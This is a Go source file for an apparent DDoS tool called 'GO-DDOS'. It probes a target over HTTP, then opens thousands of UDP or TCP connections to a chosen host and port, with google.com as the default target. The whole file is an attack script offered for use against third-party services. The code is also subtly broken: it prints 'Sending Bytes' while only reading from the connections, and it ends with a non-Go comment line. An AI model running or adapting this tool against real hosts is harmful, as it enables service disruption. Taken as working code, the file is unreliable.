package main
import (
"fmt"
"net/http"
"flag"
"log"
"time"
"bufio"
"net"
"os"
)
type Ddos struct{
ip string
port string
bytes int
requests int
protocol string
} 
func Banner(){
        banner_print := `
 @@@@@@@   @@@@@@           @@@@@@@  @@@@@@@   @@@@@@   @@@@@@ 
!@@       @@!  @@@          @@!  @@@ @@!  @@@ @@!  @@@ !@@     
!@! @!@!@ @!@  !@! @!@!@!@! @!@  !@! @!@  !@! @!@  !@!  !@@!!  
:!!   !!: !!:  !!!          !!:  !!! !!:  !!! !!:  !!!     !:! 
 :: :: :   : :. :           :: :  :  :: :  :   : :. :  ::.: :  
`
fmt.Println(banner_print)
time.Sleep(1)
fmt.Println("Made By FonderElite | Github: https://github.com/FonderElite")
}
func Request(ipadd string) *Ddos{
ip_a := Ddos{ip: ipadd}
req,err := http.Get("http://" + ipadd)
if err != nil{
fmt.Println("Try.")
}else{
fmt.Println("[!]Checking if the host is up..." )
if req.StatusCode == 200 && req.StatusCode != 400{
time.Sleep(2)
fmt.Printf("[%v]Success Status-code.",req.StatusCode)
}else{
fmt.Printf("[%v]Host Seems down.",req.StatusCode)
fmt.Println("Terminating Go Program...")
time.Sleep(1 * time.Second)
os.Exit(1)
}
}
defer req.Body.Close()
return &ip_a
}
func MalBytes(site string,port string, bytes int,request int,protocol string)*Ddos{
ip_ac := Ddos{ip: site,port: port,bytes:bytes, requests: request, protocol:protocol}
p := make([]byte,ip_ac.bytes)
for i := 0; i <  int(ip_ac.requests); i++{
        conn,err := net.Dial(ip_ac.protocol,ip_ac.ip + ":" + ip_ac.port)
        fmt.Printf("\n[%v]Sending Bytes-> %v",ip_ac.bytes,ip_ac.ip)
        fmt.Printf("\nSending Requests[%v]-> %v",i,ip_ac.ip)
if err != nil{
log.Fatal(err)
}
read, err := bufio.NewReader(conn).Read(p)
fmt.Println(read)
if err != nil{
log.Fatal(err)
}
}
return &ip_ac
}
func main(){
first_arg :=  flag.String("domain", "google.com", "Domain Name")
second_arg := flag.String("port", "80", "Port to connect")
third_arg := flag.Int("bytes",32,"Amount of bytes to send")
fourth_arg := flag.Int("requests",65000,"Number of requests to send.")
fifth_arg := flag.String("protocol","udp","udp/tcp")
flag.Parse()
Banner()
Request(*first_arg)
MalBytes(*first_arg,*second_arg,*third_arg,*fourth_arg,*fifth_arg)
}
#Learn to code, skiddies.
